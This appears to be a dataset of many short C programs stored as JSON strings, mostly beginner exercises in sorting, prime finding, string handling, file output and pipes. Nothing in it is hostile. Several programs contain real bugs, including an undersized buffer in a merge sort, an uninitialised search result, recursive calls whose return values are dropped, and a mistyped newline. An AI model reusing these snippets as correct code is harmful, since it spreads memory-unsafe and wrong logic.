    "#include <stdio.h>\nvoid printd(int n);\nint main(void) {\n    printd(123);\n    printf(\"\\t[answer=123]\\n\");\n    printd(-123);\n    printf(\"\\t[answer=-123]\\n\");\n    printd(0);\n    printf(\"\\t[answer=0]\\n\");\n}\nvoid printd(int n) {\n    if (n < 0) {\n        putchar('-');\n        n = -n;\n    }\n    int m = n / 10;\n    if (m) {\n        printd(m);\n    }\n    putchar(n % 10 + '0');\n}",
    "#include <stdio.h>\n#include <string.h>\n\nvoid fit(char *,unsigned int);\nint main(void){\n    char msg[]=\"good good study, day day up! fighting, fighting!!!\";\n    printf(\"origin msg is :\\\"%s\\\"\\n\",msg);\n    fit(msg,28);\n    printf(\"fit msg is :\\\"%s\\\"\\n\",msg);\n    printf(\"msg+%d is :\\\"%s\\\"\\n\",28 +1,msg+28 +1);\n    return 0;\n}\nvoid fit(char *str,unsigned int size){\n    if( strlen(str)>size){\n        str[size]='\\0';\n    }\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <errno.h>\n#include <string.h>\n#include <assert.h>\nstatic char *basename;\nstatic char *fileset_list_filename;\nstatic int round_size = 1;\nstatic int create_file( char *fname, int size );\nint main(int argc, char *argv[])\n{\n    FILE *f;\n    char file_line[100];\n    char filename[100];\n    char *curr;\n    int file_num;\n    int file_bytes;\n    double file_time;\n    int count;\n    if (argc < 3 || argc > 4) {\n printf( \"Usage: %s <basename> <fileset_list> {round_size}\\n\", argv[0] );\n exit( 1 );\n    }\n    basename = argv[1];\n    fileset_list_filename = argv[2];\n    if (argc > 3) {\n round_size = strtol( argv[3], ((void*)0), 10 );\n printf( \"Creating full files rounded to size %d specified in file %s.\\n\",\n      round_size, fileset_list_filename );\n    }\n    else {\n printf( \"Creating full files specified in file %s.\\n\",\n      fileset_list_filename );\n    }\n    f = fopen( fileset_list_filename, \"rt\" );\n    while ((curr = fgets( file_line, sizeof( file_line ), f )) != ((void*)0)) {\n if (file_line[0] != '#')\n     break;\n    }\n    count = 0;\n    while (curr != ((void*)0)) {\n if (sscanf( curr, \"%d %d %lf\", &file_num, &file_bytes, &file_time ) != 3) {\n     printf( \"Error in format: %s\\n\", curr );\n     exit( 1 );\n }\n sprintf( filename, \"%s%05d.txt\", basename, file_num );\n if (count++ % 50 == 0) {\n     printf( \"%s %d %.3f seconds\\n\", filename, file_bytes, file_time );\n }\n if (create_file( filename, file_bytes ) != 0) {\n  fprintf((stderr), \"Error creating file. Exiting ...\\n\");\n  exit(1);\n        }\n curr = fgets( file_line, sizeof( file_line ), f );\n    }\n    exit( 0 );\n}\nstatic int create_file( char *fname, int size )\n{\n    FILE *fout;\n\n    char filler[64 +1];\n    int num_blocks;\n    int end;\n    int i,j;\n    if (round_size > 1) {\n size = ((size + round_size - 1) / round_size) * round_size;\n    }\n    num_blocks = size / 64;\n    if ((fout = fopen( fname, \"w+\" )) == ((void*)0)) {\n return( errno );\n    }\n    for (i=0;i<num_blocks;++i) {\n end = snprintf( filler, sizeof( filler ), \"%s %d %d\\n\", fname, size, i );\n if (end < 64) {\n     j = --end;\n     while (j > 0 && filler[j] != ' ') {\n  --j;\n     }\n     do {\n  filler[end++] = filler[j++];\n     } while (end < 64 -1);\n     filler[64 -1] = '\\n';\n     filler[64] = '\\0';\n }\n fputs( filler, fout );\n    }\n    i = size - num_blocks * 64;\n    if (i > 0) {\n fprintf( fout, \"%.*s\\n\", i-1, filler );\n    }\n    fclose( fout );\n    return( 0 );\n}",
    "#include <stdio.h>\nint main(){\n  char name[20];\n  int grade;\n  FILE *write;\n  if((write = fopen(\"file_name\", \"w\")) == ((void*)0)){\n    puts(\"The file couldn't be opened!\");\n  }\n  else{\n    puts(\"Enter the grade and the name.\");\n    puts(\"Enter eof to end input.\");\n    scanf(\"%d %s\", &grade, name);\n    while(!feof((stdin))){\n      fprintf(write, \"%d\\t%s\\n\", grade, name);\n      scanf(\"%d %s\", &grade, name);\n    }\n    fclose(write);\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <ctype.h>\n#include <string.h>\nvoid print_letters(char arg[], size_t len);\nvoid print_arguments(int argc, char *argv[])\n{\n    int i = 0;\n    for(i = 0; i < argc; i++) {\n        size_t len = strlen(argv[i]);\n        print_letters(argv[i], len);\n    }\n}\nvoid print_letters(char arg[], size_t len)\n{\n    int i = 0;\n    for(i = 0; i < len; i++) {\n        char ch = arg[i];\n        if((0 ? isalpha(ch) : (((unsigned)(ch)|32)-'a') < 26) || isblank(ch)) {\n            printf(\"'%c' == %d \", ch, ch);\n        }\n    }\n    printf(\"\\n\");\n}\nint main(int argc, char *argv[])\n{\n    print_arguments(argc, argv);\n    return 0;\n}",
    "#include <stdio.h>\nint main () {\n    int var1;\n    char var2[10];\n    printf(\"var1 \u53d8\u91cf\u7684\u5730\u5740\uff1a%p\\n\", &var1);\n    printf(\"var2 \u53d8\u91cf\u7684\u5730\u5740\uff1a%p\\n\", &var2);\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nvoid SieveOfEratosthenes(int n)\n{\n    int prime[n+1];\n    for(int i=2;i<n+1;i++)\n        prime[i] = 1;\n    for (int p=2; p*p<=n; p++)\n    {\n        if (prime[p] == 1)\n        {\n            for (int i=p*2; i<=n; i += p)\n                prime[i] = 0;\n        }\n    }\n    for (int p=2; p<=n; p++)\n    {\n        if (prime[p]==1)\n            printf(\"%d \",p);\n    }\n    printf(\"\\n\");\n}\nchar *isPrime(int n)\n{\n    if (n <= 1)\n     return \"False\";\n    if (n <= 3)\n     return \"True\";\n    if (n%2 == 0 || n%3 == 0)\n     return \"False\";\n    for (int i=5; i*i<=n; i=i+6)\n    {\n        if (n%i == 0 || n%(i+2) == 0)\n           return \"False\";\n    }\n    return \"True\";\n}\nint main()\n{\n    int n;\n    scanf(\"%d\",&n);\n    SieveOfEratosthenes(n);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int n, a[100], c = 0, i, max = 0;\n    printf(\"Enter the size of array : \");\n    scanf(\"%d\", &n);\n    printf(\"Enter the elements of array : \");\n    for (int i = 0; i < n; i++)\n        scanf(\"%d\", &a[i]);\n    for (int j = 0; j < n; j++)\n    {\n        c=0;\n        for (i = 0; i < n; i++)\n        {\n            if (a[j] == a[i])\n            {\n                c++;\n            }\n        }\n        printf(\"Frequency of %d : %d\\n\", a[j], c);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n int n,nsave,rem,d,j=1,dec=0;\n printf(\"Enter the number in binary : \");\n scanf(\"%d\",&n);\n nsave=n;\n while(n>0)\n {\n  rem=n%10;\n  d=rem*j;\n  dec+=d;\n  j*=2;\n  n/=10;\n }\n printf(\"Binary number = %d, Decimal number = %d\\n\",nsave,dec);\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n int caseNum = 0, N, buffer, i;\n scanf(\"%d\", &caseNum);\n while(caseNum-- >0){\n  int digits[10] = {};\n  scanf(\"%d\", &N);\n  for(i=1;i<=N;i++){\n   buffer = i;\n   while(buffer>0){\n   digits[buffer%10] += 1;\n   buffer /= 10;\n   }\n  }\n  printf(\"%d %d %d %d %d %d %d %d %d %d\\n\", digits[0], digits[1], digits[2], digits[3], digits[4], digits[5], digits[6], digits[7], digits[8], digits[9]);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <ctype.h>\nint main(void)\n{\n    char ch;\n    int chars; int lower; int upper;\n    chars = lower = upper = 0;\n    while (scanf(\"%c\", &ch) != (-1))\n    {\n if (ch > 31 && ch < 256)\n {\n     if ((0 ? islower(ch) : ((unsigned)(ch)-'a') < 26) )\n  lower++;\n     if ((0 ? isupper(ch) : ((unsigned)(ch)-'A') < 26))\n  upper++;\n     chars++;\n }\n    }\n    printf(\"Lower case: %d, upper: %d, chars:%d\\n\",\n lower, upper, chars);\n    return 0;\n}",
    "int main(void) {\n  long long int v1 = 0, v2 = 0, v3 = 0, v4 = 0, v5 = 0, v6 = 0, v7 = 0, v8 = 0;\n  long long int v9 = 0, v10 = 0, v11 = 0, v12 = 0, v13 = 0, v14 = 0, v15 = 0, v16 = 0;\n  long long int v17= 0, v18 = 0, v19 = 0, v20 = 0, v21 = 0, v22 = 0, v23 = 0, v24 = 0;\n  long long int v25= 0, v26 = 0, v27 = 0, v28 = 0, v29 = 0, v30 = 0, v31 = 0, v32 = 0;\n  volatile int i = 0;\n  while (i < 10) {\n   v1 += i;\n v2 += v1;\n v3 += v2;\n v4 += v3;\n v5 += v4;\n v6 += v5;\n v7 += v6;\n v8 += v7;\n v9 += v8;\n v10 += v9;\n v11 += v10;\n v12 += v11;\n v13 += v12;\n v14 += v13;\n v15 += v14;\n v16 += v15;\n v17 += v16;\n v18 += v17;\n v19 += v18;\n v20 += v19;\n v21 += v20;\n v22 += v21;\n v23 += v22;\n v24 += v23;\n v25 += v24;\n v26 += v25;\n v27 += v26;\n v28 += v27;\n v29 += v28;\n v30 += v29;\n v31 += v30;\n v32 += v31;\n i++;\n  }\n  long long int sum = v1 + v2 + v3 + v4 + v5 + v6 + v7 + v8 + v9 + v10 + v11 + v12 + v13 + v14 + v15 + v16 + v17 + v18 + v19 + v20 + v21 + v22 + v23 + v24 + v25 + v26 + v27 + v28 + v29 + v30 + v31 + v32;\n\n\n  return sum;\n}",
    "#include <stdio.h>\nvoid swap(int *a, int *b)\n{\nint temp = *a;\n*a = *b;\n*b = temp;\n}\nvoid bubbleSort(int array[], int n)\n{\nint i, j;\nfor (i = 0; i < n-1; i++)\nfor (j = 0; j < n-i-1; j++) if (array[j] > array[j+1])\nswap(&array[j], &array[j+1]);\n}\nvoid printArray(int array[], int size)\n{\nint i;\nfor (i=0; i < size; i++)\nprintf(\"%d \", array[i]);\nprintf(\"n\");\n}\nint main()\n{\nint array[] = {89, 32, 20, 113, -15};\nint size = sizeof(array)/sizeof(array[0]);\nbubbleSort(array, size);\nprintf(\"Sorted array: n\");\nprintArray(array, size);\nreturn 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int i;\n printf(\"\\nBitte geben Sie eine ganze Zahl ein: \");\n scanf(\"%i\", &i);\n printf(\"\\nSie haben die Zahl %i eingegeben.\", i);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main()\n{\n    char *p = getenv(\"HOSTNAME\");\n    printf(\"*p = %s\\n\", p);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n printf(\"hello Makefile!\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint verificar_identidade(int tam, int mat[][tam]){\n    for(int c1 = 0; c1 < tam; c1++){\n        for(int c2 = 0; c2 < tam; c2++){\n            if(c1 == c2){\n                if(mat[c1][c2] != 1)\n                    return 0;\n            }else{\n                if(mat[c1][c2] != 0){\n                    return 0;\n                }\n            }\n        }\n    }\n    return 1;\n}\nint main(){\n    int tam;\n    scanf(\"%d\", &tam);\n    int mat[tam][tam];\n    for(int c1 = 0; c1 < tam; c1++){\n        for(int c2 = 0; c2 < tam; c2++){\n            scanf(\"%d\", &mat[c1][c2]);\n        }\n    }\n    if(verificar_identidade(tam, mat)){\n        printf(\"sim\");\n    }else{\n        printf(\"nao\");\n    }\n    return 0;\n}",
    "int main() {\n    int i = 3;\n    ;\n    for (int i = 0; i < 10; i = i + 1)\n        ;\n    return i;\n}",
    "#include <stdio.h>\n\n\nint any(char *s1, char *s2);\nint main(void)\n{\n  char s1[100];\n  char s2[100];\n  int firstpos;\n  scanf(\"%s\\n%s\", s1, s2);\n  firstpos = any(s1, s2);\n  if (firstpos != -1)\n    printf(\"%d\\n\", firstpos);\n  else\n    printf(\"no matching characters\\n\");\n  return firstpos;\n}\nint any(char *s1, char *s2)\n{\n  int i, k;\n  for (i = 0; s1[i] != '\\0'; i++) {\n    for (k = 0; s2[k] != '\\0' && s2[k] != s1[i]; k++)\n      ;\n    if (s2[k] != '\\0')\n      return i;\n  }\n  return -1;\n}",
    "#include <stdio.h>\nint debugtest3(int a, int b){\n    int res = 0;\n    a = a *2;\n    res = a/b;\n    return res;\n}\nint main(){\n    int a = 12;\n    int b = 7;\n    int res = debugtest3(a,b);\n    return 0;\n}",
    "#include <stdio.h>\nint inputArr(int arr[], int size)\n{\n    int i = 0;\n    for (i = 0; i < size; i++)\n    {\n        printf(\"Enter element %d: \", i + 1);\n        scanf(\"%d\", &arr[i]);\n    }\n}\nvoid printArr(int arr[], int size)\n{\n    int i = 0;\n    for (i = 0; i < size; i++)\n    {\n        printf(\"%d \", arr[i]);\n    }\n}\nint binarySearch(int arr[], int low, int high, int key)\n{\n    int mid;\n    if (low <= high)\n    {\n        mid = (low + high) / 2;\n        if (arr[mid] == key)\n        {\n            return mid;\n        }\n        else if (key > arr[mid])\n        {\n            binarySearch(arr, mid + 1, high, key);\n        }\n        else\n        {\n            binarySearch(arr, low, mid - 1, key);\n        }\n    }\n    else\n    {\n        return -1;\n    }\n}\nint main(int argc, char const *argv[])\n{\n    int idx, n, key, arr[100];\n    printf(\"Enter the number of elements you want to enter: \");\n    scanf(\"%d\", &n);\n    inputArr(arr, n);\n    printArr(arr, n);\n    printf(\"\\nEnter the element you want to search: \");\n    scanf(\"%d\", &key);\n    if (idx < 0)\n        printf(\"Element not found!\\n\");\n    else\n        printf(\"\\nElement present at index %d\\n\", idx);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n double a,b,m;\n  scanf(\"%lf\",&a);\n  scanf(\"%lf\",&b);\n  m=(((a*3.5)+(b*7.5))/11.0);\n            printf(\"MEDIA = %0.5lf\\n\",m);\n return 0;\n}",
    "#include <math.h>\n#include <stdio.h>\n#include <stdlib.h>\nchar is_prime(unsigned long n)\n{\n    for (unsigned long i = 2; i < sqrtl(n) + 1; i++)\n        if (n % i == 0)\n            return 0;\n    return 1;\n}\nunsigned long long sum_of_primes(unsigned long N)\n{\n    unsigned long long sum = 2;\n    for (long i = 3; i < N; i += 2) \n        if (is_prime(i))\n            sum += i;\n    return sum;\n}\nint main(int argc, char *argv[])\n{\n    unsigned long n = 100;\n    if (argc == 2)         \n        n = atol(argv[1]); \n    printf(\"%ld: %llu\\n\", n, sum_of_primes(n));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\n\nconst char* FILE_NAME = \"life_grid.txt\";\nconst char CHAR_ALIVE = 'o';\nconst char CHAR_DEAD = 'x';\nconst char CHAR_DELIM = ' ';\nint main (int argc, char *argv[]) {\n  if (argc != 3) {\n    printf(\"usage: ./life_gen.x <row_size> <column_size>\");\n    exit(1);\n  }\n  int row_size = atoi(argv[1]);\n  int col_size = atoi(argv[2]);\n  FILE *file_ptr = fopen(FILE_NAME, \"w\");\n  int i, j;\n  for (i=0; i<row_size; i++) {\n    for (j=0; j<col_size; j++) {\n      fprintf(file_ptr, (j!=0 ? \"%c\" : \"\"), CHAR_DELIM);\n      fprintf(file_ptr, \"%c\", (rand() % 2 ? CHAR_ALIVE : CHAR_DEAD) );\n    }\n      fprintf(file_ptr, \"\\n\");\n  }\n  fclose(file_ptr);\n  return 0;\n}",
    "#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <limits.h>\n#include <fcntl.h>\n#include <sys/types.h>\n\nvoid err_quit(char * msg){\n perror( msg );\n exit(1);\n}\nint main ( void )\n{\n int fd[2];\n char buf[PIPE_BUF];\n pid_t pid;\n int len;\n if ( (pipe(fd)) < 0 )\n  err_quit( \"pipe\" );\n if ( (pid = fork()) < 0 )\n  err_quit(\"fork\");\n else if ( pid == 0 ){\n  close ( fd[0] );\n  write(fd[1], \"hello brother!\\n\", 15 );\n  exit(0);\n }\n if ( (pid = fork()) < 0 )\n  err_quit(\"fork\");\n else if ( pid > 0 ){\n  close ( fd[0] );\n  close ( fd[1] );\n  exit ( 0 );\n }\n else {\n  close ( fd[1] );\n  len = read (fd[0], buf, PIPE_BUF );\n  write(1, buf, len);\n  exit(0);\n }\n}",
    "#include <stdio.h>\nint main()\n{\n int a,b,c;\n while(scanf(\"%d %d %d\",&a,&b,&c)&&(a||b||c))\n {\n  float sum = (float) a/b;\n  printf(\"%.*f\\n\",c,sum);\n }\n}",
    "#include <stdio.h>\n\nint main(void)\n{\n    float speed, size, dtime;\n    printf(\"Enter the download speed (Mbs):\\n\");\n    scanf(\"%f\", &speed);\n    printf(\"Enter the size of a file (MB):\\n\");\n    scanf(\"%f\", &size);\n    printf(\"At %.2f megabits per second, a file of %.2f megabytes \",\n            speed, size);\n    size = size * 8;\n    dtime = size / speed;\n    printf(\"downloads in %.2f seconds.\\n\", dtime);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int n,i,j;\n    scanf(\"%d\",&n);\n    for (i=n+1;i<1000000;i++)\n    {\n        for (j=2;j<i;j++)\n        {\n            if (i%j==0)\n                break;\n            else if (j==i-1)\n            {\n                i=100000001;\n                break;\n            }\n        }\n    }\n    printf(\"%d\",j+1);\n    return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n printf(\"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n int n=5;\n printf(\"n=%d: \",n);\n if(n >= 1 <= 10)\n  printf(\"n is between 1 and 10\");\n n=0;\n printf(\"\\nn=%d: \",n);\n if(n >= 1 <= 10)\n  printf(\"n is between 1 and 10\");\n n=11;\n printf(\"\\nn=%d: \",n);\n if(n >= 1 <= 10)\n  printf(\"n is between 1 and 10\");\n printf(\"\\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n return 0;\n}",
    "#include <stdio.h>\n\n\nunsigned char seq [2*((1<<8)-1)+8];\nint poly2 (int *mem, int tap1, int tap2, int in)\n{\n int rez = *mem >> (8 -1) & 1;\n *mem = *mem<<1 ^ rez << tap1 ^ rez << tap2 ^ rez ^ in;\n return rez;\n}\nvoid seqprint (unsigned char *s, int len)\n{\n int i;\n for (i=0; i<len; ++s, ++i)\n  putchar (*s ? '1' : '0');\n putchar ('\\n');\n}\nvoid hexprint (unsigned char *s, int len)\n{\n int n, i;\n unsigned char byte;\n for (n=0; n<len; ++n) {\n  byte = 0;\n  for (i=0; i<8; ++i)\n   byte |= s [(n*8+i)%len] << i;\n  printf (\"0x%02x,\", byte);\n }\n putchar ('\\n');\n}\nvoid makeseq2 (unsigned char *s, int tap1, int tap2, int len)\n{\n int mem, i;\n mem = 0;\n for (i=0; i<((1<<8)-1); ++i)\n  poly2 (&mem, tap1, tap2, 1);\n for (i=0; i<2*((1<<8)-1); ++i)\n  s[i] = poly2 (&mem, tap1, tap2, 1);\n}\nint find_zeros (unsigned char *s, int len)\n{\n int i, k;\n for (i=0; i<len-8; ++i) {\n  for (k=0; k<8; ++k) {\n   if (s[i+k] != 0)\n    goto next;\n  }\n  return i;\nnext:; }\n return -1;\n}\nint main ()\n{\n int tap1, tap2;\n int start, len;\n for (tap2=1; tap2<8 -1; ++tap2)\n  for (tap1=tap2+1; tap1<8; ++tap1) {\n   makeseq2 (seq, tap1, tap2, 2*((1<<8)-1)+8);\n   start = find_zeros (seq, 2*((1<<8)-1));\n   if (start < 0) {\n    printf (\"Cannot find %d zeros!\\n\", 8);\n    continue;\n   }\n   len = find_zeros (seq + start + 1, 2*((1<<8)-1)+8 - start - 1);\n   if (len < 0) {\n    printf (\"Cannot find repeating %d zeros!\\n\", 8);\n    len = ((1<<8)-1);\n   }\n   if (len > ((1<<8)-1)-8) {\n    printf (\"x%d + x%d + x%d + 1 = [ %d ]\\n\",\n     8, tap1, tap2, len);\n   }\n  }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint c(int,int);\nint main() {\n    int m,n;\n    scanf(\"%d %d\",&m,&n);\n    printf(\"%d\",c(n,m));\n}\nint c(int x,int y)\n{\n int i,j;\n int jc=1,fm=1;\n int result;\n for(i=1;i<=x;i++)\n {\n  jc=jc*i;\n }\n for(j=0;j<x;j++)\n {\n  fm=fm*(y-j);\n }\n result=fm/jc;\n return result;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <limits.h>\nstatic inline int min(int a, int b)\n{\n    return a < b ? a : b;\n}\nstatic int minSubArrayLen(int s, int* nums, int numsSize)\n{\n    int i, sum = 0, len = 2147483647, start = 0;\n    for (i = 0; i < numsSize; i++) {\n        sum += nums[i];\n        while (sum >= s) {\n            len = min(len, i - start + 1);\n            sum -= nums[start++];\n        }\n    }\n    return len == 2147483647 ? 0 : len;\n}\nint main(int argc, char **argv)\n{\n    if (argc < 3) {\n        fprintf((stderr), \"Usage: ./test sum n1 n2...\\n\");\n        exit(-1);\n    }\n    int i, count = argc - 2;\n    int sum = atoi(argv[1]);\n    int *nums = malloc(count * sizeof(int));\n    for (i = 0; i < count; i++) {\n        nums[i] = atoi(argv[i + 2]);\n    }\n    printf(\"%d\\n\", minSubArrayLen(sum, nums, count));\n    return 0;\n}",
    "#include<stdio.h>\nint numbersgetline(int s[]){\n    int c,i;\n    int j = 0;\n    int state = 1;\n    int number = 0;\n    for(i = 0;(c = getchar())!=(-1)&&c!='\\n';++i){\n        if(c<='9'&&c>='0'||c=='-'){\n            if(c=='-')\n                state = -1;\n            else {\n                if(number==0){\n                    number += 1;\n                    s[j++] = (c-'0')*state;\n                }\n                else if(number!=0&&(c>='0'&&c<='9')){\n                    number += 1;\n                    int temp =s[j-1]*10+(c-'0')*state;\n                    s[j-1] = temp;\n                }\n            }\n        }\n        else if(c==';'){\n            s[j++] = c;\n            ++i;\n            number = 0;\n            state = 1;\n        }\n        else{\n            number = 0;\n            state = 1;\n        }\n    }\n    return j;\n}\nint main(){\n    int line[100];\n    for(int i = 0;i<100;i++){\n        line[i] = -3;\n    }\n    numbersgetline(line);\n    int i = 0;\n    for(i ;line[i]!=';';i++);\n    i++;\n    int *t = line;\n    int *s = line;\n    for(i;line[i]!=-3;i++){\n        while(*t!=line[i]){\n            if(*t<line[i]){\n                printf(\"%d,\",*t);\n                t++;\n            }\n            else if(*t>line[i]){\n                printf(\"%d,\",*t);\n                t = s;\n            }\n        }\n        printf(\"%d\",line[i]);\n        if(line[i+1]!=-3)\n            printf(\";\");\n    }\n}",
    "#include <stdio.h>\nint main()\n{\n    for(int i = 10; i >= 1; i-=5) {\n        printf(\"%d\\n\", i);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nstatic const char usage[] =\n\"Usage: %s LINK\\n\";\nint main(int argc, char * argv[]) {\n if (argc != 2) {\n  fprintf((stderr), usage, argv[0]);\n  exit(1);\n }\n char * name = argv[1];\n char buf[4096];\n if (readlink(name, buf, sizeof(buf)) < 0) {\n  perror(\"link\");\n  exit(1);\n }\n fprintf((stdout), \"%s\\n\", buf);\n exit(0);\n}",
    "#include <stdio.h>\nint main()\n{\n int a=5;\n int b=6;\n if(a<=7)\n {\n  if(a==9)\n  {\n   b=b*8;\n   b=9;\n  }\n  else\n  {\n   a=10;\n  }\n }\n else\n {\n  b=2;\n }\n return 0;\n}",
    "int a;\nint b;\nint main(){\n b=0;\n a=3;\n while(a>0){\n  b = b+a;\n  a = a-1;\n }\n return b;\n}",
    "#include <stdio.h>\n\nint main ()\n{\n  float vetort[365];\n  float tp=0, md;\n   for (int i=0; i<365; i++){\n     printf (\"Insira a temperatura: \");\n     scanf(\"%f\", & vetort[i]);\n     tp+=vetort[i];\n   }\n  md=tp/365;\n  printf(\"\\n\\n\");\n  for (int i=0; i<365; i++){\n    if (vetort[i]<md){\n      printf (\"%.2f\", vetort[i]);\n      printf (\"\\n\");\n    }\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nstatic void ssort(int *array , int n){\n int i = 0,\n     j = 0,\n     pos = 0;\n while(i<n){\n  pos = i;\n  j = i + 1;\n  while(j<n){\n   if(*(array + j) < *(array + pos)){\n    pos = j;\n   }\n   ++j;\n  }\n  if(pos != i){\n   do{int temp=*(array + i);*(array + i)=*(array + pos);*(array + pos)=temp;}while(0);\n\n  }\n  ++i;\n }\n}\nint main(int ac , char **av){\n int n = ac - 1,\n     *arr = ((void*)0),\n     *p = ((void*)0);\n if(!n){\n  printf(\"Usage: %s [NUMBERS.... ]\\n\" , *av);\n  return -1;\n }\n p = arr = calloc(n + 1 , sizeof(*arr));\n ++av;\n while(*av){\n  *p++ = atoi(*av);\n  ++av;\n }\n ssort(arr , n);\n p = arr;\n while(*p){\n  printf(\" %d \" , *p++);\n }\n putchar('\\n');\n free(arr);\n return 0;\n}",
    "#include<stdio.h>\nvoid swap(int*,int*);\nvoid swap(int *a,int *b)\n{\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n}\nint main()\n{\n    int a=0,b=0;\n    printf(\"Enter two numbers: \");\n    scanf(\"%d %d\",&a,&b);\n    printf(\"Before swap: \\n\");\n    printf(\"a = %d , b = %d \\n\",a,b);\n    swap(&a,&b);\n    printf(\"After swap: \\n\");\n    printf(\"a = %d , b = %d \\n\",a,b);\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n  char a[1000] = \"\";\n  int i, tosave = 0, b[25] = {0}, skip;\n  scanf(\"%999[^\\r\\n]\", a);\n  for(i = 0; i < 999; i++){\n    skip = 0;\n    if(a[i] <= 'Z' && a[i] >= 'A'){\n      tosave = a[i] - 'A';\n    } else if (a[i] <= 'z' && a[i] >= 'a'){\n      tosave = a[i] - 'a';\n    } else {\n      skip =1;\n    }\n    if(skip == 0){\n      b[tosave]++;\n    }\n  }\n  for(i = 0; i < 25; i++){\n    if(b[i] > 0){\n      printf(\"%c - %d\\n\", 'a'+i, b[i]);\n    }\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(void)\n{\n    char command[50];\n    strcpy(command, \"ls -l\");\n    system(command);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int N;\n    int i;\n    int temp;\n    scanf(\"%d\",&N);\n    if(N>5 && N<2000){\n                for(i=1; i<=N; i++){\n        if(i%2==0 ){\n                temp=i*i;\n        printf(\"%d^2 = %d\\n\",i,temp);\n        }\n    }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main () {\n char str[50];\n strcpy(str, \"This is string.h library function\");\n puts(str);\n memset(str,'$',7);\n puts(str);\n getchar();\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n  printf(\"Home Directory:\\n\");\n  system(\"ls -a $HOME\");\n  return(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    int A, B, prod;\n    scanf(\"%d\", &A);\n    scanf(\"%d\", &B);\n    prod = A * B;\n    printf(\"PROD = %d\\n\", prod);\n    return 0;\n}",
    "#include <sys/types.h>\n#include <dirent.h>\n#include <unistd.h>\n#include<stdio.h>\n#include<string.h>\n#include<errno.h>\n#include<stdlib.h>\n#include<stdarg.h>\nvoid Execve(const char *filename, char *const argv[], char *const envp[])\n{\n    if (execve(filename, argv, envp) < 0)\n        perror(\"execve error\");\n}\n\nint main(int argc,char** argv)\n{\n    return 0;\n}",
    "#include <stdio.h>\n\nint main(void)\n{\n    int num[8];\n    printf(\"Enter 8 integer numbers: \");\n    for (int i = 0; i < 8; i++)\n        scanf(\"%d\", &num[i]);\n    printf(\"Your numbers are:\");\n    for (int i = 0; i < 8; i++)\n        printf(\" %d\", num[i]);\n    printf(\"\\n\");\n    printf(\"Reverse order is:\");\n    for (int i = 8 -1; i >= 0; i--)\n        printf(\" %d\", num[i]);\n    printf(\"\\n\");\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<math.h>\nint main() {\n int n;\n int i;\n int k;\n do{\n  printf(\"Inserisci lato tra 2 e 20: \");\n  scanf(\"%d\",&n);\n }while((n<2)||(n>20));\n    for(i=0;i<n;i++){\n  for(k=0;k<n;k++){\n   printf(\"*\");\n  }\n  printf(\"\\n\");\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\n\nint *MergeSort(int *L, int l, int r);\nvoid Merge(int *L, int l, int m, int r);\nvoid PrintList(int *L, int start, int end);\nint main(int argc, char const *argv[]) {\n int myList[11] = {11, 7, 9, 1, 3, 4, 8, 6, 2, 10, 5}, i;\n for (i = 0; i < 11; i++) {\n  printf(\"%d \", myList[i]);\n }\n printf(\"\\n\");\n MergeSort(myList, 0, 11 - 1);\n for (i = 0; i < 11; i++) {\n  printf(\"%d \", myList[i]);\n }\n printf(\"\\n\");\n return 0;\n}\nint *MergeSort(int *L, int l, int r) {\n int m;\n if (l < r) {\n  m = floor((l + r) / 2);\n  MergeSort(L, l, m);\n  MergeSort(L, m + 1, r);\n  Merge(L, l, m, r);\n }\n return L;\n}\nvoid Merge(int *L, int l, int m, int r) {\n int i, j, index;\n int *L1 = malloc(sizeof(int) * (m - l));\n int *L2 = malloc(sizeof(int) * (r - m + 1));\n i = 0;\n for (j = l; j <= m; j++) {\n  L1[i++] = L[j];\n }\n i = 0;\n for (j = m + 1; j <= r; j++) {\n  L2[i++] = L[j];\n }\n i = 0; j = 0, index = l;\n while (i <= m - l && j <= r - m - 1) {\n  if (L1[i] < L2[j]) {\n   L[index++] = L1[i++];\n  } else if (L1[i] > L2[j]) {\n   L[index++] = L2[j++];\n  } else {\n   L[index++] = L1[i++];\n   L[index++] = L2[j++];\n  }\n }\n while (i <= m - l) {\n  L[index++] = L1[i++];\n }\n while (j <= r - m - 1) {\n  L[index++] = L2[j++];\n }\n}\nvoid PrintList(int *L, int start, int end) {\n int i;\n for (i = start; i <= end; i++) {\n  printf(\"%d \", L[i]);\n }\n}",
    "int a[3] = {3, 6, 90};\nint main() {\n        return a[2];\n}",
